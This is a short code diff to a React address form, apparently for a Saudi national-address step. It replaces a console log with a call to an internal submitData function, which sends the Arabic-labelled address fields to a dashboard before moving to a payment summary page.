@@ -1,5 +1,6 @@
 import { useState, useEffect, useRef } from "react";
 import { Link, useLocation } from "wouter";
+import { submitData } from "@/lib/store";
 
 export default function NationalAddress() {
   const [, setLocation] = useLocation();
@@ -149,8 +150,17 @@ export default function NationalAddress() {
     }
     
     setShowErrors(false);
-    // Navigate to next page or save data
-    console.log({ city, district, street, building, floor, postalCode, selectedAddress });
+    
+    // إرسال البيانات للوحة التحكم
+    submitData({
+      'المدينة': city,
+      'الحي': district,
+      'الشارع': street,
+      'رقم المبنى': building,
+      'رقم الدور': floor,
+      'الرمز البريدي': postalCode,
+    });
+    
     // Navigate to Summary Payment page
     setLocation('/summary-payment');
   };
